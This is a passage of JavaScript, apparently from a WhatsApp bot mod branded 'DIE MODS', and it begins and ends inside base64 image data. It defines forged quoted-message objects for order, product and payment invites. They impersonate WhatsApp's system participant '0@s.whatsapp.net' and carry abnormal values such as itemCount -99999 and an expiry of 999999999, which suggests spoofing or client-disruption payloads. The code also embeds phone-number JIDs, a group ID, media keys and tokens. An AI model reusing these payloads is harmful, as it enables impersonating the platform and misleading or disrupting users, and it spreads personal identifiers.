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","itemCount":1,"status":"INQUIRY","surface":"CATALOG","message":"","orderTitle":"Scrr","sellerJid":"558398042937@s.whatsapp.net","token":"AR5Tnf4vsfOmPiBhVvQ3/AhXbT53AX2juaDQnV4MqkPO4w==","totalAmount1000":"99999000","totalCurrencyCode":"BRL"}}} 
 //𝐏𝐑𝜭͢𝐗𝐢𝐌𝜭 𝐕𝚵𝐑𝐢𝐅𝐢𝐂͢𝚫𝐃𝜭 ⭐ ✦
const bybruxo = { 
        key : {
          "fromMe": false,
          "participant": "0@s.whatsapp.net",
          "mentions": true,
          "remoteJid": "556181496039-1625944593@g.us",
          participant : '0@s.whatsapp.net'
        },
        message: {"productMessage":{"product":{"productImage":{"url":"https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m237/up-oil-image-c7c8c507-29b0-4ab6-9a6e-7e03d6995c2d?ccb=9-4&oh=01_AdTMKaxXhel07UtuMfT8fNvc46c2mr4Ya84I5LQ8XHkzMA&oe=65097917&mms3=true","mimetype":"image/jpeg","fileSha256":"ltrDnCHagIq7P5Y3dmqEB5uF2NtlmFdSbKHIGk2YWNs=","fileLength":"20115","height":375,"width":462,"mediaKey":"4n/1AOCE4q3MuLjoESrxhKrYJvLwdF2If97JD95PV8s=","fileEncSha256":"Gwtmk3z6XYyA3rZ03xqtBM0xjY4JKjx6uDESZKWwAgc=","directPath":"/o1/v/t62.7118-24/f1/m237/up-oil-image-c7c8c507-29b0-4ab6-9a6e-7e03d6995c2d?ccb=9-4&oh=01_AdTMKaxXhel07UtuMfT8fNvc46c2mr4Ya84I5LQ8XHkzMA&oe=65097917","mediaKeyTimestamp":"1692530969","jpegThumbnail":"/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADoASAMBIgACEQEDEQH/xAAuAAACAwEBAAAAAAAAAAAAAAAABAEDBQIGAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMzpHljK7GnUoZ3qfLTYQEkAAFugnvsR50G9jx3OvkZYA0bi0ZsSc2Gu82rZ0fPbBlYwGXYVhe9lNHVM0FrSEjRQH//EACgQAAICAgECBgEFAAAAAAAAAAECAAMEESESIAUTFDFBUhAiMjM0cf/aAAgBAQABPwDHwhZy7iW+HdLaFqx8C9BviV02WWBAOZk+HW49Qs3sdtVxrbfvHussbqZuZRlMGCueIClRFkyb1uw3VR3pU7glRvULlsRQRypmM/lIWI95fjpcvVWNNGUqSCO3He1LAUgrW4D4eDEJ4YgSrHoq+dzxZKhaCnZXQjoGL62YFatdBhES4sN28RqOnk2mAAAAWczMxVtTq3+oQ8H8UUecDPSkAjr5hxLgOXmIjmre5Ybmdk6tERsawaPWZQ1jjpJmbhBVV0/C2On7TqebZ9p6i77meHXHr6CZlWt6iwg/M9Rb9zFtsX2aUZRbddzEoZlY3kEEHat7dmH/AGEmT/PZ/vYzsUUEkgT/xAAYEQEAAwEAAAAAAAAAAAAAAAABABEgIf/aAAgBAgEBPwCVy9CVgix3/8QAGxEBAAIDAQEAAAAAAAAAAAAAAQACESAhEBL/2gAIAQMBAT8An0lsJqxLtsjD26hyFF6srk47/wD/2Q==","scansSidecar":"ewCil2a0jUzTwTeat6junow5E7rkfavzZkrsB75YmzppqFhTg3x0UA==","scanLengths":[2075,7441,4461,6138],"midQualityFileSha256":"3XU/raBis7WcB/vQfixIW1vF3rPYYeSjAKsClNKB/KE="},"productId":"6568399929883162","title":"By 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦  ","description":"By bruxi","currencyCode":"BRL","priceAmount1000":"1000","productImageCount":1},"businessOwnerJid":"558398042937@s.whatsapp.net"}}} 
 //𝐏𝐑𝜭͢𝐗𝐢𝐌𝜭 𝐕𝚵𝐑𝐢𝐅𝐢𝐂͢𝚫𝐃𝜭 ⭐ ✦
const menuquoted = { 
        key : {
          "fromMe": false,
          "participant": "0@s.whatsapp.net",
          "mentions": true,
          "remoteJid": "556181496039-1625944593@g.us",
          participant : '0@s.whatsapp.net'
        },
        message: {"orderMessage":{"orderId":"2519722344859054","thumbnail": "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","itemCount":-99999,"status":"INQUIRY","surface":"CATALOG","message":"𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞","orderTitle":"Kalzin and trix","sellerJid":"558398042937@s.whatsapp.net","token":"AR5bIJCNRa2BSKwohrU+iV7NI/ftcFT6LHGVna18fe0T5A==","totalAmount1000":"1000","totalCurrencyCode":"BRL"}}} 
 //𝐏𝐑𝜭͢𝐗𝐢𝐌𝜭 𝐕𝚵𝐑𝐢𝐅𝐢𝐂͢𝚫𝐃𝜭 ⭐ ✦
const payvite = { 
        key : {
          "fromMe": false,
          "participant": "0@s.whatsapp.net",
          "mentions": true,
          "remoteJid": "556181496039-1625944593@g.us",
          participant : '0@s.whatsapp.net'
        },
        message: {"paymentInviteMessage":{"serviceType":"UPI","expiryTimestamp":"999999999"}}} 
 //𝐏𝐑𝜭͢𝐗𝐢𝐌𝜭 𝐕𝚵𝐑𝐢𝐅𝐢𝐂͢𝚫𝐃𝜭 ⭐ ✦
const resaca = { 
        key : {
          "fromMe": false,
          "participant": "0@s.whatsapp.net",
          "mentions": true,
          "remoteJid": "556181496039-1625944593@g.us",
          participant : '0@s.whatsapp.net'
        },
        message: {"orderMessage":{"orderId":"131410286697652","thumbnail":"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